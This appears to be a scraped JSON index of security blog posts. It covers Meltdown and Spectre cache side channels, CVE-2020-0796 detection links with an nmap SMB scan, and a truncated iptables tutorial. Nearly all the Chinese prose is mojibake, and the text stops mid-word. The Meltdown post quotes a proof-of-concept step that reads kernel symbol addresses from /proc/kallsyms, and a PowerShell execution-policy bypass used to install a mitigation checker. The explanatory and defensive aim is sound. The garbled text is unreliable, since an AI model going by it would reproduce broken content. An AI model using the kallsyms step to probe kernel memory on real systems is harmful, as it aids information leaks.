è¿™ä¸ªè¢«cacheçš„åœ°å€å‘¢ï¼Ÿè¿™æ—¶å€™éœ€è¦ç”¨åˆ°çš„åŸç†å°±æ˜¯åˆ©ç”¨cacheçš„è®¿é—®å»¶æ—¶ï¼Œå³å·²ç»è¢«cacheçš„æ•°æ®è®¿é—®æ—¶é—´çŸ­ï¼Œæ²¡æœ‰è¢«cacheçš„æ•°æ®è®¿é—®æ—¶é—´é•¿ã€‚ç”±äºrbxè¿™ä¸ªarrayæ˜¯åœ¨ç”¨æˆ·åœ°å€ç©ºé—´å†…çš„ï¼Œå¯ä»¥è‡ªç”±æ“ä½œï¼Œé¦–å…ˆæˆ‘ä»¬è¦ç¡®ä¿æ•´ä¸ª rbxè¿™ä¸ªæ•°ç»„éƒ½æ˜¯æ²¡æœ‰è¢«cacheçš„ï¼Œç„¶åæ‰§è¡Œä¸Šè¿°æ”»å‡»ä»£ç ï¼Œè¿™æ—¶å€™ rbx + rax è¿™ä¸ªåœ°å€å°±å·²ç»è¢«cacheäº†ï¼Œæ¥ä¸‹æ¥éå†æ•´ä¸ªrbx æ¢æµ‹æ•°ç»„ï¼Œæ¥æµ‹é‡è®¿é—®æ—¶é—´ï¼Œè®¿é—®æ—¶é—´æœ€çŸ­çš„é‚£ä¸ª page å°±å¯ä»¥ç¡®å®šä¸º rbx + raxã€‚ï¼ˆå¦‚ä¸‹å›¾ï¼Œå›¾æ¥è‡ªåŸè®ºæ–‡meltdownï¼‰\nå¯ä»¥çœ‹åˆ°è®¿é—®é€Ÿåº¦æœ€å¿«çš„ï¼Œå°±æ˜¯å·²ç»è¢«cacheåˆ°çš„å†…æ ¸åœ°å€ç©ºé—´ä¸­çš„ä¸€ä¸ªå­—èŠ‚byteï¼Œå¦‚æ­¤å¾ªç¯ï¼Œå³å¯è·å¾—å…¨éƒ¨å†…æ ¸ç©ºé—´çš„æ•°æ®ã€‚\ngithubä¸­çš„PoCå°±æ˜¯åˆ©ç”¨sudo cat /proc/kallsyms | grep â€œlinux_proc_bannerâ€è·å–linux_proc_banneråœ¨å†…æ ¸ä¸­çš„åœ°å€ï¼Œå†è¯»å–è¯¥åœ°å€ä¸Šçš„å€¼ï¼Œå»è·å– /proc/version çš„å†…å®¹ï¼Œè¯æ˜æ¼æ´å­˜åœ¨\n è‡³äºå’ŒmeltdownåŒæœŸçš„spectreæ¼æ´ï¼Œå’Œ meltdown çš„åŸç†ç›¸ä¼¼ï¼Œåˆ©ç”¨åˆ†æ”¯é¢„æµ‹é”™è¯¯çš„ speculative executionï¼Œè®¿é—®åˆ°ä¸è¯¥è®¿é—®çš„ä¿¡æ¯ï¼Œå¹¶ä¸”åŒæ ·æ˜¯é€šè¿‡ cache è¿™ä¸ªside channel ä¼ é€’å‡ºå»ã€‚è€Œä¸”ç”±äºåˆ©ç”¨çš„åˆ†æ”¯é¢„æµ‹åŸç†æ™®åŠç‡éå¸¸é«˜ï¼ŒSpectre çš„å½±å“é¢æ›´å¤§ä¸€äº›ã€‚\n å…·ä½“çš„Meltdownçš„exploitåˆ†æå¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« ï¼š[Meltdown_Exploitåˆ†æ](https://www.freebuf.com/articles/system/159811.html#0X02 Exploit åˆ†æ)\næˆ‘ç°åœ¨åªæ˜¯æ‡‚äº†ä»–ä¸ºä»€ä¹ˆè¿™ä¹ˆåšï¼Œä½†æ˜¯æˆ‘è¿˜æƒ³æ‡‚å¾—ä»–ä¸ºä»€ä¹ˆä¼šæƒ³åˆ°è¿™ä¹ˆåšï¼ˆè¦å»æ€è€ƒ1.ä»–åšäº†ä»€ä¹ˆ2.ä»–ä¸ºä»€ä¹ˆè¿™ä¹ˆåš3.ä»–ä¸ºä»€ä¹ˆè¿™æ ·æƒ³4.å¿˜äº†å“ªçœ‹åˆ°çš„é€»è¾‘å±‚æ¬¡(ç»å¯¹ä¸æ˜¯ç™¾åº¦æœå‡ºæ¥çš„é‚£ä¸ª)\n//TODO\nlibkdumpè¿™æ˜¯ä½œè€…å¼€æºå‡ºæ¥çš„expåº“ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡é˜…è¯»(//TODOï¼šç­‰æˆ‘å¯¹æ“ä½œç³»ç»Ÿæœ‰ç€æ›´æ·±å±‚æ¬¡çš„ç†è§£æ—¶ï¼Œæ¥åˆ†æä»£ç )å¹¶ç¼–è¯‘å®ƒï¼Œæˆ–è€…ç›´æ¥åˆ©ç”¨ä»–ç¼–è¯‘åçš„åº“æ¥ä½¿ç”¨\n0x02 è§£å†³åŠæ³•   Linuxä¸Šç°åœ¨æå‡ºçš„è§£å†³æ‰‹æ®µæ˜¯KPTIï¼ˆé€šç”¨æŠ€æœ¯ç§°ä¸ºKaiserï¼‰ï¼Œå†…æ ¸å’Œç”¨æˆ·æ€ä¸å…±äº«é¡µè¡¨ï¼Œæ¯æ¬¡ä½ å¼‚å¸¸ã€IOã€ç³»ç»Ÿè°ƒç”¨ï¼Œéƒ½è¦æŠŠå†…æ ¸é¡µè¡¨é‡æ–°è£…è¿›æ¥ã€‚ https://lwn.net/Articles/738975/\n  windowså·²ç»æ¨é€æ¼æ´æ›´æ–°äº†ï¼Œåœ¨æŸä¸ªç³»ç»Ÿè¡¥ä¸é‡Œ0.0\n1 2 3 4 5  //ä»¥ç®¡ç†å‘˜æƒé™æ‰“å¼€powershellè¿è¡Œå‘½ä»¤ //å¯ä»¥çœ‹åˆ°æç¤º Set-ExecutionPolicy Bypass Install-Module SpeculationControl Get-SpeculationControlSettings     å…¶ä½™å¯å‚è§æ–‡ç« ï¼šå²ä¸Šæœ€å¤§CPUæ¼æ´Meltdown \u0026 Spectre å½±å“ä¸ä¿®å¤æŒ‡å—\n0x03 æ¼æ´å±å®³ Meltdownä¸Spectreæœ¬è´¨ä¸Šéƒ½æ˜¯åŸºäºç¼“å­˜ä¾§ä¿¡é“çš„æ”»å‡»ã€‚\nMeltdownä¸Spectreä¸»è¦ç”¨äºä¿¡æ¯æ³„éœ²ï¼Œå¹¶ä¸èƒ½å¯¹ç›®æ ‡å†…å­˜åœ°å€è¿›è¡Œä»»æ„ä¿®æ”¹ã€‚æ”»å‡»è€…å¿…é¡»è¦æœ‰æ‰§è¡Œæƒé™æ‰èƒ½è¿›è¡Œæ”»å‡»ï¼Œå¯¹äºä¸€èˆ¬ç”¨æˆ·åªè¦ä¸è¢«æ‰§è¡Œæ¶æ„ä»£ç ï¼ˆæ¯”å¦‚è®¿é—®æ¶æ„ç½‘ç«™ï¼‰ï¼Œå°±ä¸ä¼šè¢«Meltdownä¸Spectreæ”»å‡»ã€‚ä½†æ˜¯åœ¨äº‘ç«¯ï¼Œæ”»å‡»è€…å¯ä»¥ç§Ÿèµè™šæ‹Ÿæœºæ¥æ‰§è¡Œæ”»å‡»è€…æƒ³è¦æ‰§è¡Œçš„ä»»æ„ä»£ç ï¼Œä»è€Œè·å–å®¿ä¸»ç‰©ç†æœºä»¥åŠå…¶å®ƒç§Ÿæˆ·çš„ä¿¡æ¯ï¼Œè¿™å¯¹äº‘æœåŠ¡å•†çš„å†²å‡»è¿˜æ˜¯éå¸¸å¤§çš„ã€‚\n æ–‡ä¸­å…³äºexpçš„æ€è€ƒé—®é¢˜ï¼š\nå€¼å¾—è¿›ä¸€æ­¥æ€è€ƒçš„é—®é¢˜    è¯¥åˆ©ç”¨ä»£ç ä¸€æ¬¡åªèƒ½æ¢æµ‹ä¸€ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œå¦‚æœåœ¨å†…æ ¸æ•°æ®è¿˜æ²¡è¯»å–å®Œæ•´ä¹‹å‰å¤„ç†å™¨å·²ç»å¤„ç†å¼‚å¸¸äº†è¯¥æ€ä¹ˆåŠï¼Ÿ ä¸ªäººè®¤ä¸ºï¼šè§‰å¾—åº”è¯¥å¯ä»¥å¤šæ¬¡æ¢æµ‹ï¼Œä¸æ˜¯æ¯æ¬¡éƒ½èƒ½è¿™ä¹ˆå¿«å¤„ç†å¼‚å¸¸çš„\n  æ¢æµ‹æ•°ç»„target_arrayæ˜¯å¦å¯ä»¥ä¸ç”¨è®¾ç½®æˆ256*4KBï¼Œè®¾ç½®æˆ512*2KBï¼Œ1024*1KBæ•ˆæœä¼šå¦‚ä½•ï¼Ÿ ä¸ªäººè®¤ä¸ºï¼šåº”è¯¥æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯æ„Ÿè§‰æ•ˆç‡æ²¡æœ‰256 * 4KBçš„æ•ˆç‡é«˜\n  æ¢æµ‹æ•°ç»„target_arrayæ˜¯ä¸ªå¤§æ•°ç»„ï¼Œå ç”¨å¤šä¸ªå†…å­˜é¡µé¢ï¼Œæ˜¯å¦å®¹æ˜“è¢«æ£€æµ‹åˆ°ï¼Ÿ ä¸ªäººè®¤ä¸ºï¼šåº”è¯¥æ˜¯ä¸å®¹æ˜“è¢«æ£€æµ‹åˆ°çš„ï¼Œåˆ‡æ¢é¡µé¢ä¹Ÿéœ€è¦æ—¶é—´ï¼Œå å¤šä¸ªé¡µé¢å¯¼è‡´æ•ˆç‡å¤§å¤§é™ä½\n    ","description":"Something about Meltdown","tags":["CVE","hardware"],"title":"Meltdown And Hardware Security","uri":"/posts/meltdown-and-hardware-security/"},{"categories":["windows"],"content":" details about new SMB wormable bug leak:\nADV200005 | Microsoft Guidance for Disabling SMBv3 Compression\nMicrosoft patches SMBv3 wormable bug that leaked earlier this week\nCVE-2020-0796ç›¸å…³ä¿¡æ¯ï¼ˆsmbv3æ¼æ´æ£€æµ‹å·¥å…·ï¼‰ï¼š\nnikallass / check-smb-v3.11.sh ï¼šlinuxä¸‹çš„æ£€æµ‹è„šæœ¬\nScanner for CVE-2020-0796 - SMBv3 RCE ï¼š åŸºäºpython3çš„æ£€æµ‹è„šæœ¬\nvimeo è§†é¢‘æ¼”ç¤º\nCVE-2020-0796ç›¸å…³åˆ†æä¿¡æ¯ï¼š\nSMBGhost â€“ Analysis of CVE-2020-0796\nå¾®è½¯SMBv3å®¢æˆ·ç«¯/æœåŠ¡ç«¯è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2020-0796ï¼‰æŠ€æœ¯åˆ†æ\nCVE-2020-0796-PoCï¼š\nPoC for triggering buffer overflow via CVE-2020-0796\nCVE-2020-0796 - Windows SMBv3 LPE exploit #SMBGhost\n æ¦‚è¿° PoCæŠ¥å‘Šå¯ä»¥çœ‹è¿™ä¸ªæ–‡æ¡£ ï¼Œè™½ç„¶Windows defenderæ²¡æœ‰ç›´æ¥åˆ é™¤ï¼Œä½†æ˜¯å½“å†…å®¹ä¿å­˜æ—¶ï¼Œæç¤ºæˆ‘éœ€è¦å‘åˆ°è¿œç«¯æœåŠ¡å™¨åˆ¤æ–­ï¼Œçœ‹æ¥windows defenderè¿˜æ˜¯æŒºé è°±çš„\n3.12çˆ†å‡ºçš„æ¼æ´ï¼Œ3.18å…¬å¸ƒexp\n windows SMB 3ä½¿ç”¨è¯´æ˜ï¼š\nhttps://docs.microsoft.com/zh-cn/windows-server/storage/file-server/file-server-smb-overview\n å—å½±å“çš„ç³»ç»Ÿ  + Windows 10 Version 1903 for 32-bit Systems + Windows 10 Version 1903 for ARM64-based Systems + Windows 10 Version 1903 for x64-based Systems + Windows 10 Version 1909 for 32-bit Systems + Windows 10 Version 1909 for ARM64-based Systems + Windows 10 Version 1909 for x64-based Systems + Windows Server, version 1903 (Server Core installation) + Windows Server, version 1909 (Server Core installation) POC  æ£€æŸ¥æœ¬åœ°è®¡ç®—æœºä¸Šçš„æ´»åŠ¨SMBè¿æ¥ç‰ˆæœ¬ï¼ˆWindows 8åŠæ›´é«˜ç‰ˆæœ¬ï¼‰  Powershell.exe-\u003e Get-SMBConnection è¿™ä»…æ˜¾ç¤ºå½“å‰æ‰“å¼€çš„SMBè¿æ¥   Nmapæ‰«æä»¥æ£€æŸ¥æ”¯æŒçš„SMBåè®®ç‰ˆæœ¬ nmap -p445 --script smb-protocols \u003cç›®æ ‡ä¸»æœº/å­ç½‘\u003e | grep -P'\\ d + \\ã€‚\\ d + \\ã€‚\\ d + \\ã€‚\\ d + | ^ \\ |ã€‚\\ s + 3.11'  æ¼æ´åˆ†æ ","description":"","tags":["CVE","Windows","security"],"title":"CVE-2020-0796","uri":"/posts/cve-2020-0796/"},{"categories":["linux","Network"],"content":"iptables  å‚è€ƒï¼š\niptables - Linux man page\niptables_command\niptablesè¯¦è§£\niptablesè¯¦è§£\niptablesè¯¦è§£åŠä¸€äº›å¸¸ç”¨è§„åˆ™\n ç®€ä»‹ netfilter/iptablesï¼ˆç®€ç§°ä¸ºiptablesï¼‰ç»„æˆLinuxå¹³å°ä¸‹çš„åŒ…è¿‡æ»¤é˜²ç«å¢™ï¼Œä¸å¤§å¤šæ•°çš„Linuxè½¯ä»¶ä¸€æ ·ï¼Œè¿™ä¸ªåŒ…è¿‡æ»¤é˜²ç«å¢™æ˜¯å…è´¹çš„ï¼Œå®ƒå¯ä»¥ä»£æ›¿æ˜‚è´µçš„å•†ä¸šé˜²ç«å¢™è§£å†³æ–¹æ¡ˆï¼Œå®Œæˆå°åŒ…è¿‡æ»¤ã€å°åŒ…é‡å®šå‘å’Œç½‘ç»œåœ°å€è½¬æ¢ï¼ˆNATï¼‰ç­‰åŠŸèƒ½ã€‚\niptablesåˆ†ä¸º2éƒ¨åˆ†ï¼Œä¸€éƒ¨åˆ†ä½äºå†…æ ¸ä¸­ï¼Œç”¨æ¥å­˜æ”¾è§„åˆ™ï¼Œç§°ä¸ºNetFilterã€‚è¿˜æœ‰ä¸€æ®µåœ¨ç”¨æˆ·ç©ºé—´ä¸­ï¼Œç”¨æ¥å®šä¹‰è§„åˆ™ï¼Œå¹¶å°†è§„åˆ™ä¼ é€’åˆ°å†…æ ¸ä¸­ï¼Œè¿™æ®µåœ¨ç”¨æˆ·ç©ºé—´ä¸­çš„ç¨‹åºå°±å«åšiptablesã€‚ æ‰€ä»¥å¯¹äºç”¨æˆ·ç©ºé—´æ¥è¯´ï¼Œå°±æ˜¯æŒ‰ç…§éœ€è¦ç”Ÿæˆä¸€æ¡æ¡è§„åˆ™ï¼Œç„¶åå‘å†…æ ¸ä¸­æäº¤ï¼Œå­˜æ”¾åˆ°NetFilterï¼Œè®©è¿™äº›è§„åˆ™åœ¨æ•°æ®ä¼ è¾“ä¸å¤„ç†çš„è¿‡ç¨‹ä¸­èµ·ä½œç”¨ã€‚å½¢è±¡åŒ–åœ°ç†è§£æ¥è¯´å°±æ˜¯ï¼ŒæŠŠiptablesçœ‹ä½œæ˜¯ä¸€ä¸ªå®¢æˆ·ç«¯ä»£ç†ï¼Œç”¨æˆ·é€šè¿‡iptablesè¿™ä¸ªä»£ç†ï¼Œä¸å†…æ ¸ä¸­çš„å®‰å…¨æ¡†æ¶netfilterè¿›è¡Œäº¤äº’ã€‚netfilteræ‰æ˜¯é˜²ç«å¢™çœŸæ­£çš„å®‰å…¨æ¡†æ¶ï¼Œå¤„äºå†…æ ¸ç©ºé—´å†…ã€‚\nNetfilteræ˜¯linuxæ“ä½œç³»ç»Ÿæ ¸å¿ƒå±‚å†…éƒ¨çš„ä¸€ä¸ªæ•°æ®åŒ…å¤„ç†æ¨¡å—ï¼Œæ‹¥æœ‰å¦‚ä¸‹åŠŸèƒ½ï¼š\n ç½‘ç»œåœ°å€è½¬æ¢(Network Address Translate) æ•°æ®åŒ…å†…å®¹ä¿®æ”¹ æ•°æ®åŒ…è¿‡æ»¤çš„é˜²ç«å¢™åŠŸèƒ½  é“¾ iptableså¼€å¯åï¼Œæ•°æ®æŠ¥æ–‡ä»è¿›å…¥æœåŠ¡å™¨åˆ°å‡ºæ¥ç»è¿‡5æ¡é“¾ï¼Œåˆ†åˆ«ä¸º prerouting ã€ input ã€output ã€ forward ã€ postrouting\nå¦‚ä¸‹å›¾ï¼Œå³æ•°æ®æŠ¥æ–‡çš„å¯èƒ½ç»è¿‡çš„è·¯å¾„\næ¯æ¡é“¾ä¸Šè®¾æœ‰å¤šç§è§„åˆ™ï¼Œæ•°æ®æŠ¥æ–‡å¿…é¡»æŒ‰ç…§é¡ºåºä¸€ä¸ªä¸ªåŒ¹é…è¿™äº›è§„åˆ™\næ­£å¦‚å›¾ä¸­ï¼Œæ•°æ®æŠ¥æ–‡ç»è¿‡çš„5æ¡é“¾ä¸Šï¼Œå¿…é¡»é€ä¸€ç»è¿‡æ¯ä¸€æ¡é“¾ï¼Œè€Œåœ¨é“¾ä¸Šï¼Œæ•°æ®æŠ¥æ–‡å¿…é¡»é€ä¸€é€šè¿‡(ç¬¦åˆ)æ¯ä¸€ä¸ªè§„åˆ™çš„é™åˆ¶ï¼Œæ–¹èƒ½åˆ°ä¸‹ä¸€æ¡é“¾ä¸Š\n INPUTé“¾ï¼šå½“æ¥æ”¶åˆ°é˜²ç«å¢™æœ¬æœºåœ°å€çš„æ•°æ®åŒ…(å…¥ç«™)æ—¶ï¼Œåº”ç”¨æ­¤é“¾çš„è§„åˆ™ OUTPUTé“¾ï¼šå½“é˜²ç«å¢™æœ¬æœºå‘å¤–å‘é€æ•°æ®åŒ…(å‡ºç«™)æ—¶ï¼Œåº”ç”¨æ­¤é“¾çš„è§„åˆ™ FORWARDé“¾ï¼šå½“æ¥æ”¶åˆ°éœ€è¦é€šè¿‡é˜²ç«å¢™å‘é€ç»™å…¶ä»–åœ°å€çš„æ•°æ®åŒ…(è½¬å‘)æ—¶ï¼Œåº”ç”¨æ­¤é“¾çš„è§„åˆ™ PREROUTINGé“¾ï¼šåœ¨å¯¹æ•°æ®åŒ…ä½œè·¯ç”±é€‰æ‹©ä¹‹å‰ï¼Œåº”ç”¨æ­¤é“¾çš„è§„åˆ™ï¼Œå¦‚DNAT POSTROUTINGé“¾ï¼šåœ¨å¯¹æ•°æ®åŒ…ä½œè·¯ç”±é€‰æ‹©ä¹‹åï¼Œåº”ç”¨æ­¤é“¾çš„è§„åˆ™ï¼Œå¦‚SNAT  åœ¨é“¾çš„ç¬¬ä¸€å¼ å›¾ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å½¢è±¡åœ°çœ‹å‡ºæ•°æ®åŒ…åœ¨å“ªäº›æ¡ä»¶ä¸‹éœ€è¦ç»è¿‡å“ªäº›é“¾\ninputå’Œoutputé“¾æ›´å¤šåº”ç”¨åœ¨ä¸»æœºé˜²ç«å¢™ä¸­ï¼Œä¸»è¦é’ˆå¯¹æœ¬æœºè¿›å‡ºçš„æ•°æ®å®‰å…¨æ§åˆ¶ï¼Œè€Œpreroutingã€postroutingã€forwardé“¾æ›´å¤šåº”ç”¨åœ¨ç½‘ç»œé˜²ç«å¢™ä¸­ï¼Œç‰¹åˆ«æ˜¯é˜²ç«å¢™æœåŠ¡å™¨ä½œä¸ºç½‘å…³æ—¶ä½¿ç”¨çš„æƒ…å†µ\nè¡¨çš„æ¦‚å¿µ è™½ç„¶ä¸€æ¡é“¾ä¸Šæœ‰å¤šæ¡è§„åˆ™ï¼Œä½†æ˜¯åŸºäºæŸäº›è§„åˆ™çš„ä½œç”¨åŠŸèƒ½å¾ˆç›¸ä¼¼ï¼Œå› æ­¤æœ‰å¤šä¸ªç›¸ä¼¼åŠŸèƒ½çš„è§„åˆ™ç»„æˆäº†è¡¨ï¼Œiptablesä¸ºæˆ‘ä»¬æä¾›äº†å››ç§è¡¨\n filterè¡¨ï¼šä¸»è¦ç”¨äºå¯¹æ•°æ®åŒ…è¿›è¡Œè¿‡æ»¤ï¼Œæ ¹æ®å…·ä½“çš„è§„åˆ™å†³å®šæ˜¯å¦æ”¾è¡Œè¯¥æ•°æ®åŒ…(å¦‚DROPã€ACCEPT ã€REJECT ã€ LOG  )ï¼Œæ‰€è°“é˜²ç«å¢™å…¶å®åŸºæœ¬ä¸Šæ˜¯æŒ‡è¿™å¼ è¡¨ä¸Šçš„è¿‡æ»¤è§„åˆ™ï¼Œå¯¹åº”å†…æ ¸æ¨¡å—çš„iptables_filter natè¡¨ï¼šNetwork Address Translationï¼Œç½‘ç»œåœ°å€è½¬æ¢åŠŸèƒ½ï¼Œä¸»è¦ç”¨äºä¿®æ”¹æ•°æ®åŒ…çš„ipåœ°å€ã€ç«¯å£å·ä¿¡æ¯ç­‰ ( å¦‚ SNAT ã€ DNAT ã€ MASQUERADE ã€REDIRECT )ã€‚å±äºä¸€ä¸ªæµçš„åŒ…åªä¼šç»è¿‡è¿™ä¸ªè¡¨ä¸€æ¬¡ï¼Œå¦‚æœç¬¬ä¸€ä¸ªåŒ…è¢«å…è®¸åšNATæˆ–Masqueradedï¼Œé‚£ä¹ˆä½™ä¸‹çš„åŒ…éƒ½ä¼šè‡ªåŠ¨åšç›¸åŒçš„æ“ä½œï¼Œå¯¹åº”å†…æ ¸æ¨¡å—çš„iptables_nat mangleè¡¨ï¼šæ‹†è§£æŠ¥æ–‡ï¼Œåšå‡ºä¿®æ”¹ï¼Œå¹¶é‡æ–°å°è£…ï¼Œä¸»è¦ç”¨äºä¿®æ”¹æ•°æ®åŒ…çš„TOS(Type of Serviceï¼ŒæœåŠ¡ç±»å‹)ã€TTL( Time To Liveï¼Œç”Ÿå­˜å‘¨æœŸ)ä»¥åŠä¸ºæ•°æ®åŒ…è®¾ç½®Markæ ‡è®°ï¼Œä»¥å®ç°QoS(Quality Of Service ï¼ŒæœåŠ¡è´¨é‡)è°ƒæ•´ä»¥åŠç­–ç•¥è·¯ç”±ç­‰åº”ç”¨ï¼Œç”±äºéœ€è¦ç›¸åº”çš„è·¯ç”±è®¾å¤‡æ”¯æŒï¼Œå› æ­¤åº”ç”¨å¹¶ä¸å¹¿æ³›ï¼Œå¯¹åº”å†…æ ¸æ¨¡å—iptables_mangle rawè¡¨ï¼šä»iptables 1.2.9ç‰ˆæœ¬åæ–°æ·»åŠ çš„è¡¨ï¼Œä¸»è¦ç”¨äºå†³å®šæ•°æ®åŒ…æ˜¯å¦è¢«çŠ¶æ€è·Ÿè¸ªæœºåˆ¶å¤„ç†ï¼Œåœ¨åŒ¹é…æ•°æ®åŒ…æ—¶ï¼Œrawè¡¨è§„åˆ™è¦æœ‰ä¼˜å…ˆäºå…¶ä»–è¡¨ï¼Œå¯¹åº”å†…æ ¸æ¨¡å—iptables_raw  æˆ‘ä»¬è‡ªå®šä¹‰çš„æ‰€æœ‰è§„åˆ™ï¼Œéƒ½ä¼šæ·»åŠ åˆ°å››å¼ è¡¨ä¸­çš„å…¶ä¸­ä¸€å¼ è¡¨ä¸­\nè§„åˆ™è¡¨ä¹‹é—´çš„ä¼˜å…ˆé¡ºåºï¼šRaw \u003e\u003e mangle \u003e\u003e nat \u003e\u003e filter\nè¡¨é“¾å…³ç³» 5æ¡é“¾ä¸­ï¼Œå¹¶ä¸æ˜¯æ¯æ¡é“¾éƒ½èƒ½åº”ç”¨æ‰€æœ‰ç±»å‹çš„è¡¨ï¼Œäº‹å®ä¸Šé™¤äº†Outputé“¾ä¸Šèƒ½åŒæ—¶æ‹¥æœ‰å››ç§è¡¨ä»¥å¤–ï¼Œå…¶ä»–éƒ½åªèƒ½æœ‰ä¸¤åˆ°ä¸‰ç§è¡¨\nä¸Šå›¾å³ä¸ºæ¯ç§é“¾èƒ½åº”ç”¨çš„è¡¨ï¼Œå®é™…ä¸Šï¼Œåœ¨å„è¡¨ä¸­è¿˜æœ‰åŒ¹é…é¡ºåºï¼Œæ¯æ¡é“¾ä¸Šçš„å„ä¸ªè¡¨çš„åŒ¹é…é¡ºåºä¸ºï¼š raw â†’Â mangle â†’Â nat â†’Â filter\næŠŠä¸Šå›¾è½¬æ¢æˆè¡¨ï¼Œå¯ç›´è§‚åœ°çœ‹å‡ºæ¥ï¼Œè¡¨é“¾çš„å…³ç³»\n    raw mangle nat filter     prerouting 1 1 1 0   input 0 1 1 1   forward 0 1 0 1   output 1 1 1 1   postrouting 0 1 0 1    æ•°æ®åŒ…é€šè¿‡é˜²ç«å¢™æµç¨‹å¯ä»¥æ€»ç»“å¦‚ä¸‹ï¼š\nè§„åˆ™çš„æ¦‚å¿µ iptablesè§„åˆ™ä¸»è¦åŒ…å«äº†â€œæ¡ä»¶\u0026åŠ¨ä½œâ€ï¼Œå³åŒ¹é…å‡ºç¬¦åˆä»€ä¹ˆæ¡ä»¶(è§„åˆ™)åï¼Œå¯¹å®ƒé‡‡å–æ€æ ·çš„åŠ¨ä½œ\nåŒ¹é…æ¡ä»¶  S_IPï¼šsource ipï¼Œå³æºip S_PORTï¼šsource portï¼Œæºç«¯å£ D_IPï¼šdestination ipï¼Œç›®æ ‡ip D_PORTï¼šdestination portï¼Œç›®æ ‡ç«¯å£ TCP/UDPï¼šç¬¬å››å±‚åè®®(ä¼ è¾“å±‚)  å¤„ç†çš„åŠ¨ä½œ  ACCEPTï¼šå…è®¸æ•°æ®åŒ…é€šè¿‡ DROPï¼šç›´æ¥ä¸¢å¼ƒæ•°æ®åŒ…ï¼Œä¸å›åº”ä»»ä½•ä¿¡æ¯ï¼Œå®¢æˆ·ç«¯åªæœ‰å½“è¯¥é“¾è¶…æ—¶åæ‰ä¼šæœ‰ååº” REJECTï¼šæ‹’ç»æ•°æ®åŒ…ï¼Œä¼šç»™å®¢æˆ·ç«¯å‘é€ä¸€ä¸ªæ•°æ®åŒ…è¢«ä¸¢å¼ƒçš„ç›¸åº”ä¿¡æ¯ SNATï¼šSæŒ‡Sourceï¼ŒæºNATï¼ˆæºåœ°å€è½¬æ¢ï¼‰ï¼Œå†è¿›å…¥è·¯ç”±å±‚é¢çš„routeä¹‹åï¼Œå‡ºæœ¬åœ°çš„ç½‘ç»œçº¿ä¹‹å‰ï¼Œæ”¹å†™æºåœ°å€ï¼Œç›®æ ‡åœ°å€ä¸å˜ï¼Œå¹¶åœ¨æœ¬æœºå»ºç«‹NATè¡¨é¡¹ï¼Œå½“æ•°æ®è¿”å›æ—¶ï¼Œæ ¹æ®NATè¡¨å°†ç›®çš„åœ°å€æ•°æ®æ”¹å†™ä¸ºæ•°æ®å‘é€å‡ºå»çš„æºåœ°å€ï¼Œå¹¶å‘ç»™ä¸»æœºï¼Œè§£å†³ç§ç½‘ç”¨æˆ·ç”¨åŒä¸€ä¸ªå…¬ç½‘ipä¸Šç½‘çš„é—®é¢˜ MASQUERADEï¼šæ˜¯SNATçš„ä¸€ç§ç‰¹æ®Šå½¢å¼ï¼Œé€‚ç”¨äºåŠ¨æ€çš„ã€ä¸´æ—¶ä¼šå˜çš„IPä¸Šï¼› DNATï¼šDæŒ‡Destinationï¼Œç›®çš„NATï¼Œè§£å†³ç§ç½‘æœåŠ¡ç«¯ï¼Œæ¥æ”¶å…¬ç½‘è¯·æ±‚çš„é—®é¢˜ã€‚å’ŒSNATç›¸åï¼ŒIPåŒ…ç»è¿‡routeä¹‹å‰ï¼Œé‡æ–°ä¿®æ”¹ç›®æ ‡åœ°å€ï¼Œæºåœ°å€ä¸å˜ï¼Œåœ¨æœ¬æœºå»ºç«‹NATè¡¨é¡¹ï¼Œå½“æ•°æ®è¿”å›æ—¶ï¼Œæ ¹æ®NATè¡¨å°†æºåœ°å€ä¿®æ”¹ä¸ºæ•°æ®å‘é€è¿‡æ¥æ—¶çš„ç›®æ ‡åœ°å€ï¼Œå¹¶å‘ç»™è¿œç¨‹ä¸»æœºã€‚å¯ä»¥éšè—åç«¯æœåŠ¡å™¨çš„çœŸå®åœ°å€ REDIRECTï¼šåœ¨æœ¬æœºåšç«¯å£æ˜ å°„ï¼› LOGï¼šåœ¨/var/log/messagesæ–‡ä»¶ä¸­è®°å½•æ—¥å¿—ä¿¡æ¯ï¼Œç„¶åå°†æ•°æ®åŒ…ä¼ é€’ç»™ä¸‹ä¸€æ¡è§„åˆ™  é™¤å»æœ€åä¸€ä¸ªLOGï¼Œå‰ä¸‰æ¡è§„åˆ™åŒ¹é…æ•°æ®åŒ…åï¼Œè¯¥æ•°æ®åŒ…å°±ä¸ä¼šå†å¾€ä¸‹ç»§ç»­åŒ¹é…äº†ï¼Œæ‰€ä»¥ç¼–å†™è§„åˆ™çš„é¡ºåºæå…¶å…³é”®\n å…³äºDNATå’ŒSNATï¼š\nhttps://blog.51cto.com/sxj007/110924\nç®€å•æ¥è¯´ï¼ŒSNATæ˜¯æ›¿æ¢æ¥æ”¶åˆ°çš„æ•°æ®åŒ…çš„æºåœ°å€ï¼Œä¸€èˆ¬ç”¨åœ¨postrouting\nè€ŒDNATæ˜¯æ›¿æ¢æ•°æ®åŒ…ä¸­çš„ç›®çš„åœ°å€ï¼Œä¸€èˆ¬ç”¨åœ¨prerouting\n å‘½ä»¤ æœ‰å…³ iptables çš„å‘½ä»¤å¯ä»¥ç”¨ä¸‹å›¾æ¥è§£é‡Š\n1  $ iptables [-t table_name] command [chain_name] [parameter] [-j target\u0026action]   parameter æ˜¯ç”¨äºæ¡ä»¶åŒ¹é…\n  æ‰€æœ‰è¡¨åå¿…é¡»å°å†™ filter / nat / mangle / raw\n  æ‰€æœ‰é“¾åå¿…é¡»å¤§å†™ INPUT / OUTPUT / FORWARD / PREROUTING / POSTROUTING\n  æ‰€æœ‰åŒ¹é…å¿…é¡»å°å†™ -s / -d / -m \u003cmodule_name\u003e / -p\n  æ‰€æœ‰åŠ¨ä½œå¿…é¡»å¤§å†™ ACCEPT / DROP / SNAT / DNAT / MASQUERADE\n  å¯¹äºparameteræ¡ä»¶åŒ¹é…ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\nå¯¹äºCommandé€‰é¡¹ï¼š -A åœ¨æŒ‡å®šé“¾æœ«å°¾æ·»åŠ (append)ä¸€æ¡æ–°è§„åˆ™\n-D åˆ 